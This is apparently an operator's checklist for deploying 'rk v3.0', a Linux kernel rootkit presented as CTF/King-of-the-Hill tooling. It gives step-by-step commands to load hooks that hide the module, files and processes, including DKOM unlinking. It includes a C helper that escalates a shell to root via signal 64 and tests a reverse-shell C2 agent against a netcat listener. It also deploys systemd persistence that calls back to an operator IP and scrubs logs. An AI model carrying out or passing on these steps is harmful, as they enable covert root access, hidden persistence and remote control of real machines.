# rk v3.0 — Command Checklist (CTF / KOTH)

All commands assume this directory:

```bash
cd "/home/kali/Desktop/working rootkit/rk"
```

## Validation status (this session)

| Check | Status | Notes |
|---|---|---|
| `python3 -m py_compile extras/c2/reverse_shell.py` | PASS | Syntax OK |
| `bash -n extras/persistence/deploy.sh` | PASS | Syntax OK |
| `bash -n extras/persistence/uninstall.sh` | PASS | Syntax OK |
| Reverse shell PTY/token/PID runtime test | PASS | Local loopback, token accepted, command output received, PID file written |
| Generated `rk-load.sh` syntax | PASS | Extracted from deploy heredoc and checked with `bash -n` |
| Generated systemd units | PASS with expected warning | `systemd-analyze verify` only warned that `/usr/local/lib/rk/rk-load.sh` does not exist yet; deploy creates it before starting units |
| `rk.ko` vermagic/build | PASS | `7.2.15+kali-amd64`, v3.0; rebuild clean in prior tests |
| Module load/full-feature/unload | PASS (prior root run) | kill/getdents/openat hooks, hide_module, `.rk` sysfs, DKOM hide, clean unhide/rmmod |
| Signal 64 escalation | NEEDS RETEST | Prior `/bin/kill -64 1` escalated the short-lived `/bin/kill` process, not the shell. Use builtin or persistent helper below. |
| `deploy.sh` / `uninstall.sh` live system test | NOT RUN | Requires root/systemd and modifies system state; this shell has no non-interactive sudo (`sudo -n` requires a password). Commands provided below for your root shell. |

## 1. Build / sanity

```bash
cd "/home/kali/Desktop/working rootkit/rk"
uname -r
make clean && make
modinfo ./rk.ko | grep -E '^(version|vermagic|parm):'
python3 -m py_compile extras/c2/reverse_shell.py
bash -n extras/persistence/deploy.sh
bash -n extras/persistence/uninstall.sh
ls -l rk.ko extras/c2/reverse_shell.py extras/persistence/deploy.sh extras/persistence/uninstall.sh
```

Expected: vermagic equals `uname -r`; all syntax checks pass.

## 2. Basic module load (root)

```bash
cd "/home/kali/Desktop/working rootkit/rk"
sudo insmod ./rk.ko debug=1
echo "insmod rc=$?"
dmesg | tail -20
grep '^rk ' /proc/modules
sudo rmmod rk
dmesg | tail -10
```

Expected: `insmod rc=0`, hooks installed, `hooks restored, unloaded`.

## 3. Full feature test (root, safe DKOM order)

```bash
cd "/home/kali/Desktop/working rootkit/rk"
sudo rmmod rk 2>/dev/null || true

sleep 3600 &
TESTPID=$!
echo "TESTPID=$TESTPID"

sudo insmod ./rk.ko debug=1 hide_open=1 hide_pid=$TESTPID dkom_hide=1 hide_module=1
echo "insmod rc=$?"
dmesg | tail -20

grep '^rk ' /proc/modules || echo "module hidden OK"
ls -d /sys/module/.rk 2>/dev/null && echo "sysfs renamed OK"
ps -ef | grep "[s]leep 3600" || echo "process hidden from listing"

# MANDATORY ORDER: unhide BEFORE rmmod/kill when DKOM is used
/bin/kill -65 1
sudo rmmod rk
grep '^rk ' /proc/modules || echo "unloaded OK"
kill $TESTPID 2>/dev/null || true
dmesg | tail -20
```

Do **not** kill `TESTPID` before signal 65 + `rmmod` when `dkom_hide=1` is active.

## 4. Signal 64 escalation retest (root)

Do **not** use `/bin/kill -64 1`; it escalates the external kill process, which exits immediately.

### Option A — shell builtin

```bash
cd "/home/kali/Desktop/working rootkit/rk"
sudo insmod ./rk.ko debug=1
kill -64 1        # builtin, not /bin/kill
id
dmesg | tail -5   # expect escalated pid ... (zsh/bash) to root
sudo rmmod rk
```

### Option B — persistent helper (reliable)

```bash
cat > /tmp/rk-esc.c <<'C'
#include <signal.h>
#include <unistd.h>
int main(void) {
    kill(1, 64);
    execl("/bin/bash", "bash", NULL);
    return 1;
}
C
gcc -o /tmp/rk-esc /tmp/rk-esc.c

cd "/home/kali/Desktop/working rootkit/rk"
sudo insmod ./rk.ko debug=1
/tmp/rk-esc
# inside spawned shell:
id
dmesg | tail -5
exit
sudo rmmod rk
```

Expected: `id` shows `uid=0(root)`; dmesg names the persistent process, not `kill`.

## 5. Reverse shell standalone test (no module required)

### Terminal A — listener

```bash
nc -lvnp 4444
```

### Terminal B — agent

```bash
cd "/home/kali/Desktop/working rootkit/rk"
python3 extras/c2/reverse_shell.py 127.0.0.1 4444 5 '' /tmp/rk-agent-test.pid
```

With token:

```bash
# Terminal A: nc -lvnp 4444, then send TOKEN as first line
# Terminal B:
python3 extras/c2/reverse_shell.py 127.0.0.1 4444 5 TOKEN /tmp/rk-agent-test.pid
```

Verify:

```bash
cat /tmp/rk-agent-test.pid
ss -tnp | grep 4444
```

Stop agent with Ctrl-C. The agent should reconnect automatically if listener restarts.

## 6. Full deploy (root, same kernel)

Operator listener:

```bash
nc -lvnp 4444
```

Target deploy:

```bash
cd "/home/kali/Desktop/working rootkit/rk"
sudo C2_HOST=<OPERATOR_IP> C2_PORT=4444 C2_DELAY=10 \
HIDE_OPEN=1 HIDE_MODULE=1 SCRUB_LOG=1 DKOM_HIDE=0 DEBUG=0 \
./extras/persistence/deploy.sh
```

With token:

```bash
sudo C2_HOST=<OPERATOR_IP> C2_PORT=4444 C2_TOKEN=<SECRET> \
./extras/persistence/deploy.sh
```

Verify after deploy:

```bash
systemctl status rk-agent.service --no-pager
systemctl status rk.service --no-pager
cat /run/rk-agent.pid
cat /etc/rk/rk.env
grep '^rk ' /proc/modules || echo "module hidden"
ls -d /sys/module/.rk /sys/module/rk 2>/dev/null || echo "sysfs hidden/renamed as expected"
dmesg | tail -30
```

Reboot persistence check:

```bash
sudo reboot
# after reboot
systemctl is-active rk-agent.service rk.service
cat /run/rk-agent.pid
grep '^rk ' /proc/modules || echo "module hidden"
ls -d /sys/module/.rk 2>/dev/null || true
```

## 7. Uninstall / cleanup (root)

```bash
cd "/home/kali/Desktop/working rootkit/rk"
sudo ./extras/persistence/uninstall.sh

# Manual verification
systemctl is-enabled rk-agent.service rk.service 2>/dev/null || echo "units disabled/absent"
grep '^rk ' /proc/modules || echo "no module loaded"
ls -d /sys/module/rk /sys/module/.rk 2>/dev/null || echo "no sysfs residue"
ls -l /usr/local/lib/rk /etc/rk /run/rk-agent.pid 2>/dev/null || echo "no install residue"
ss -lntp | grep ':4444' || echo "port 4444 free"
```

## 8. Emergency manual cleanup

If the module is hidden and `rmmod` cannot find it:

```bash
/bin/kill -65 1
sleep 0.3
sudo rmmod rk
grep '^rk ' /proc/modules || echo "clean"
ls -d /sys/module/.rk 2>/dev/null || echo "no hidden sysfs"
```

If a DKOM-hidden test process was used, always unhide before killing that process.

## 9. CTF deployment notes

- **Same-kernel only.** `deploy.sh` refuses if module vermagic does not match `uname -r`.
- If kernel differs, rebuild on target:

```bash
make clean && make
modinfo ./rk.ko | grep vermagic
uname -r
```

- Secure Boot must be off for unsigned `rk.ko`: `dmesg | grep -i secureboot`, `mokutil --sb-state`.
- Unsigned-module taint is expected: `module verification failed ... tainting kernel`.
- `hide_open=1` only affects paths whose basename starts with `rk_`.
- `DKOM_HIDE=0` is the safer default for deployment; use `DKOM_HIDE=1` only when you need task-list unlinking and can guarantee clean unhide order.
- Before leaving a machine, run uninstall and verify no module/sysfs/unit/PID residue remains.
